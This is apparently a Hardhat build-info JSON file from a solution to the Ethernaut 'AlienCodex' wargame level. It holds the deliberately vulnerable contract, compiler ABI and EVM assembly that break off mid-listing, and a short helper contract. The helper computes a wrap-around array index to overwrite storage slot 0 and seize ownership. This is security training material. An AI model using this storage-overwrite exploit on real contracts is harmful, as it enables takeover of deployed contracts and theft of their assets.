{
	"id": "a4c2fc770616362df40919f925af89df",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.5.16",
	"solcLongVersion": "0.5.16+commit.9c3226ce",
	"input": {
		"language": "Solidity",
		"sources": {
			"contracts/Ethernaut/AlienCodexHelper.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.5.0;\r\nimport \"./AlienCodex.sol\";\r\n\r\ncontract AlienCodexHelper {\r\n    function resolve(address alienCodexAddr) public {\r\n        uint slotIndex = 1;\r\n        uint i = 2**256 - 1 - uint(keccak256(abi.encodePacked(slotIndex))) + 1;\r\n        AlienCodex(alienCodexAddr).revise(i, 0x0000000000000000000000006343a423ab47cf92f89e2451171d38ac1d0606e9);\r\n    }\r\n}"
			},
			"contracts/Ethernaut/AlienCodex.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.5.0;\r\n\r\nimport 'https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol';\r\n\r\ncontract AlienCodex is Ownable {\r\n\r\n  bool public contact;\r\n  bytes32[] public codex;\r\n\r\n  modifier contacted() {\r\n    assert(contact);\r\n    _;\r\n  }\r\n  \r\n  function make_contact() public {\r\n    contact = true;\r\n  }\r\n\r\n  function record(bytes32 _content) contacted public {\r\n  \tcodex.push(_content);\r\n  }\r\n\r\n  function retract() contacted public {\r\n    codex.length--;\r\n  }\r\n\r\n  function revise(uint i, bytes32 _content) contacted public {\r\n    codex[i] = _content;\r\n  }\r\n}"
			},
			"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol": {
				"content": "pragma solidity ^0.5.0;\n\ncontract Ownable {\n    address private _owner;\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    constructor () internal {\n        _owner = msg.sender;\n        emit OwnershipTransferred(address(0), _owner);\n    }\n\n    function owner() public view returns (address) {\n        return _owner;\n    }\n\n    modifier onlyOwner() {\n        require(isOwner());\n        _;\n    }\n\n    function isOwner() public view returns (bool) {\n        return msg.sender == _owner;\n    }\n\n    function renounceOwnership() public onlyOwner {\n        emit OwnershipTransferred(_owner, address(0));\n        _owner = address(0);\n    }\n\n    function transferOwnership(address newOwner) public onlyOwner {\n        _transferOwnership(newOwner);\n    }\n\n    function _transferOwnership(address newOwner) internal {\n        require(newOwner != address(0));\n        emit OwnershipTransferred(_owner, newOwner);\n        _owner = newOwner;\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"contracts/Ethernaut/AlienCodex.sol": {
				"AlienCodex": {
					"abi": [
						{
							"anonymous": false,
							"inputs": [
								{
									"indexed": true,
									"internalType": "address",
									"name": "previousOwner",
									"type": "address"
								},
								{
									"indexed": true,
									"internalType": "address",
									"name": "newOwner",
									"type": "address"
								}
							],
							"name": "OwnershipTransferred",
							"type": "event"
						},
						{
							"constant": true,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"name": "codex",
							"outputs": [
								{
									"internalType": "bytes32",
									"name": "",
									"type": "bytes32"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "contact",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "isOwner",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "make_contact",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": true,
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"payable": false,
							"stateMutability": "view",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "_content",
									"type": "bytes32"
								}
							],
							"name": "record",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "renounceOwnership",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [],
							"name": "retract",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "uint256",
									"name": "i",
									"type": "uint256"
								},
								{
									"internalType": "bytes32",
									"name": "_content",
									"type": "bytes32"
								}
							],
							"name": "revise",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"constant": false,
							"inputs": [
								{
									"internalType": "address",
									"name": "newOwner",
									"type": "address"
								}
							],
							"name": "transferOwnership",
							"outputs": [],
							"payable": false,
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"contracts/Ethernaut/AlienCodex.sol\":165:637  contract AlienCodex is Ownable {\r... */\n  mstore(0x40, 0x80)\n    /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":210:220  msg.sender */\n  caller\n    /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":201:207  _owner */\n  0x00\n  dup1\n    /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":201:220  _owner = msg.sender */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":268:274  _owner */\n  0x00\n  dup1\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":235:275  OwnershipTransferred(address(0), _owner) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":264:265  0 */\n  0x00\n    /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":235:275  OwnershipTransferred(address(0), _owner) */\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n  mload(0x40)\n  mload(0x40)\n  dup1\n  swap2\n  sub\n  swap1\n  log3\n    /* \"contracts/Ethernaut/AlienCodex.sol\":165:637  contract AlienCodex is Ownable {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/Ethernaut/AlienCodex.sol\":165:637  contract AlienCodex is Ownable {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_1:\n        /* \"contracts/Ethernaut/AlienCodex.sol\":165:637  contract AlienCodex is Ownable {\r... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x8da5cb5b\n      gt\n      tag_13\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_8\n      jumpi\n      dup1\n      0x8f32d59b\n      eq\n      tag_9\n      jumpi\n      dup1\n      0x94bd7569\n      eq\n      tag_10\n      jumpi\n      dup1\n      0xb5c645bd\n      eq\n      tag_11\n      jumpi\n      dup1\n      0xf2fde38b\n      eq\n      tag_12\n      jumpi\n      jump(tag_2)\n    tag_13:\n      dup1\n      0x0339f300\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x33a8c45a\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x47f57b32\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x58699c55\n      eq\n      tag_6\n      jumpi\n      dup1\n      0x715018a6\n      eq\n      tag_7\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"contracts/Ethernaut/AlienCodex.sol\":543:634  function revise(uint i, bytes32 _content) contacted public {\r... */\n    tag_3:\n      tag_14\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_15\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_15:\n        /* \"contracts/Ethernaut/AlienCodex.sol\":543:634  function revise(uint i, bytes32 _content) contacted public {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_16\n      jump\t// in\n    tag_14:\n      stop\n        /* \"contracts/Ethernaut/AlienCodex.sol\":203:222  bool public contact */\n    tag_4:\n      tag_17\n      tag_18\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ethernaut/AlienCodex.sol\":474:537  function retract() contacted public {\r... */\n    tag_5:\n      tag_19\n      tag_20\n      jump\t// in\n    tag_19:\n      stop\n        /* \"contracts/Ethernaut/AlienCodex.sol\":321:379  function make_contact() public {\r... */\n    tag_6:\n      tag_21\n      tag_22\n      jump\t// in\n    tag_21:\n      stop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":540:677  function renounceOwnership() public onlyOwner {... */\n    tag_7:\n      tag_23\n      tag_24\n      jump\t// in\n    tag_23:\n      stop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":288:365  function owner() public view returns (address) {... */\n    tag_8:\n      tag_25\n      tag_26\n      jump\t// in\n    tag_25:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":444:534  function isOwner() public view returns (bool) {... */\n    tag_9:\n      tag_27\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ethernaut/AlienCodex.sol\":227:249  bytes32[] public codex */\n    tag_10:\n      tag_29\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_30\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_30:\n        /* \"contracts/Ethernaut/AlienCodex.sol\":227:249  bytes32[] public codex */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_31\n      jump\t// in\n    tag_29:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/Ethernaut/AlienCodex.sol\":385:468  function record(bytes32 _content) contacted public {\r... */\n    tag_11:\n      tag_32\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_33\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_33:\n        /* \"contracts/Ethernaut/AlienCodex.sol\":385:468  function record(bytes32 _content) contacted public {\r... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_34\n      jump\t// in\n    tag_32:\n      stop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":683:790  function transferOwnership(address newOwner) public onlyOwner {... */\n    tag_12:\n      tag_35\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_36\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_36:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":683:790  function transferOwnership(address newOwner) public onlyOwner {... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_37\n      jump\t// in\n    tag_35:\n      stop\n        /* \"contracts/Ethernaut/AlienCodex.sol\":543:634  function revise(uint i, bytes32 _content) contacted public {\r... */\n    tag_16:\n        /* \"contracts/Ethernaut/AlienCodex.sol\":291:298  contact */\n      0x00\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Ethernaut/AlienCodex.sol\":284:299  assert(contact) */\n      tag_39\n      jumpi\n      invalid\n    tag_39:\n        /* \"contracts/Ethernaut/AlienCodex.sol\":620:628  _content */\n      dup1\n        /* \"contracts/Ethernaut/AlienCodex.sol\":609:614  codex */\n      0x01\n        /* \"contracts/Ethernaut/AlienCodex.sol\":615:616  i */\n      dup4\n        /* \"contracts/Ethernaut/AlienCodex.sol\":609:617  codex[i] */\n      dup2\n      sload\n      dup2\n      lt\n      tag_41\n      jumpi\n      invalid\n    tag_41:\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      add\n        /* \"contracts/Ethernaut/AlienCodex.sol\":609:628  codex[i] = _content */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"contracts/Ethernaut/AlienCodex.sol\":543:634  function revise(uint i, bytes32 _content) contacted public {\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"contracts/Ethernaut/AlienCodex.sol\":203:222  bool public contact */\n    tag_18:\n      0x00\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/Ethernaut/AlienCodex.sol\":474:537  function retract() contacted public {\r... */\n    tag_20:\n        /* \"contracts/Ethernaut/AlienCodex.sol\":291:298  contact */\n      0x00\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Ethernaut/AlienCodex.sol\":284:299  assert(contact) */\n      tag_44\n      jumpi\n      invalid\n    tag_44:\n        /* \"contracts/Ethernaut/AlienCodex.sol\":517:522  codex */\n      0x01\n        /* \"contracts/Ethernaut/AlienCodex.sol\":517:531  codex.length-- */\n      dup1\n      sload\n      dup1\n      swap2\n      swap1\n      0x01\n      swap1\n      sub\n      tag_46\n      swap2\n      swap1\n      tag_47\n      jump\t// in\n    tag_46:\n      pop\n        /* \"contracts/Ethernaut/AlienCodex.sol\":474:537  function retract() contacted public {\r... */\n      jump\t// out\n        /* \"contracts/Ethernaut/AlienCodex.sol\":321:379  function make_contact() public {\r... */\n    tag_22:\n        /* \"contracts/Ethernaut/AlienCodex.sol\":369:373  true */\n      0x01\n        /* \"contracts/Ethernaut/AlienCodex.sol\":359:366  contact */\n      0x00\n      0x14\n        /* \"contracts/Ethernaut/AlienCodex.sol\":359:373  contact = true */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"contracts/Ethernaut/AlienCodex.sol\":321:379  function make_contact() public {\r... */\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":540:677  function renounceOwnership() public onlyOwner {... */\n    tag_24:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":410:419  isOwner() */\n      tag_50\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":410:417  isOwner */\n      tag_28\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":410:419  isOwner() */\n      jump\t// in\n    tag_50:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":402:420  require(isOwner()) */\n      tag_51\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_51:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":638:639  0 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":601:641  OwnershipTransferred(_owner, address(0)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":622:628  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":601:641  OwnershipTransferred(_owner, address(0)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n      mload(0x40)\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":668:669  0 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":651:657  _owner */\n      dup1\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":651:670  _owner = address(0) */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":540:677  function renounceOwnership() public onlyOwner {... */\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":288:365  function owner() public view returns (address) {... */\n    tag_26:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":326:333  address */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":352:358  _owner */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":345:358  return _owner */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":288:365  function owner() public view returns (address) {... */\n      swap1\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":444:534  function isOwner() public view returns (bool) {... */\n    tag_28:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":484:488  bool */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":521:527  _owner */\n      dup1\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":507:527  msg.sender == _owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":507:517  msg.sender */\n      caller\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":507:527  msg.sender == _owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":500:527  return msg.sender == _owner */\n      swap1\n      pop\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":444:534  function isOwner() public view returns (bool) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/Ethernaut/AlienCodex.sol\":227:249  bytes32[] public codex */\n    tag_31:\n      0x01\n      dup2\n      dup2\n      sload\n      dup2\n      lt\n      tag_55\n      jumpi\n      invalid\n    tag_55:\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      add\n      0x00\n      swap2\n      pop\n      swap1\n      pop\n      sload\n      dup2\n      jump\t// out\n        /* \"contracts/Ethernaut/AlienCodex.sol\":385:468  function record(bytes32 _content) contacted public {\r... */\n    tag_34:\n        /* \"contracts/Ethernaut/AlienCodex.sol\":291:298  contact */\n      0x00\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"contracts/Ethernaut/AlienCodex.sol\":284:299  assert(contact) */\n      tag_58\n      jumpi\n      invalid\n    tag_58:\n        /* \"contracts/Ethernaut/AlienCodex.sol\":442:447  codex */\n      0x01\n        /* \"contracts/Ethernaut/AlienCodex.sol\":453:461  _content */\n      dup2\n        /* \"contracts/Ethernaut/AlienCodex.sol\":442:462  codex.push(_content) */\n      swap1\n      dup1\n        /* \"--CODEGEN--\":39:40   */\n      0x01\n        /* \"--CODEGEN--\":33:36   */\n      dup2\n        /* \"--CODEGEN--\":27:37   */\n      sload\n        /* \"--CODEGEN--\":23:41   */\n      add\n        /* \"--CODEGEN--\":57:67   */\n      dup1\n        /* \"--CODEGEN--\":52:55   */\n      dup3\n        /* \"--CODEGEN--\":45:68   */\n      sstore\n        /* \"--CODEGEN--\":79:89   */\n      dup1\n        /* \"--CODEGEN--\":72:89   */\n      swap2\n      pop\n        /* \"--CODEGEN--\":0:93   */\n      pop\n        /* \"contracts/Ethernaut/AlienCodex.sol\":442:462  codex.push(_content) */\n      swap1\n      0x01\n      dup3\n      sub\n      swap1\n      0x00\n      mstore\n      keccak256(0x00, 0x20)\n      add\n      0x00\n      swap1\n      swap2\n      swap3\n      swap1\n      swap2\n      swap1\n      swap2\n      pop\n      sstore\n      pop\n        /* \"contracts/Ethernaut/AlienCodex.sol\":385:468  function record(bytes32 _content) contacted public {\r... */\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":683:790  function transferOwnership(address newOwner) public onlyOwner {... */\n    tag_37:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":410:419  isOwner() */\n      tag_62\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":410:417  isOwner */\n      tag_28\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":410:419  isOwner() */\n      jump\t// in\n    tag_62:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":402:420  require(isOwner()) */\n      tag_63\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_63:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":755:783  _transferOwnership(newOwner) */\n      tag_65\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":774:782  newOwner */\n      dup2\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":755:773  _transferOwnership */\n      tag_66\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":755:783  _transferOwnership(newOwner) */\n      jump\t// in\n    tag_65:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":683:790  function transferOwnership(address newOwner) public onlyOwner {... */\n      pop\n      jump\t// out\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":796:979  function _transferOwnership(address newOwner) internal {... */\n    tag_66:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":889:890  0 */\n      0x00\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":869:891  newOwner != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":869:877  newOwner */\n      dup2\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":869:891  newOwner != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":861:892  require(newOwner != address(0)) */\n      tag_68\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_68:\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":936:944  newOwner */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":907:945  OwnershipTransferred(_owner, newOwner) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":928:934  _owner */\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":907:945  OwnershipTransferred(_owner, newOwner) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e0\n      mload(0x40)\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":964:972  newOwner */\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":955:961  _owner */\n      0x00\n      dup1\n        /* \"https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol\":955:972  _owner = newOwner */\n  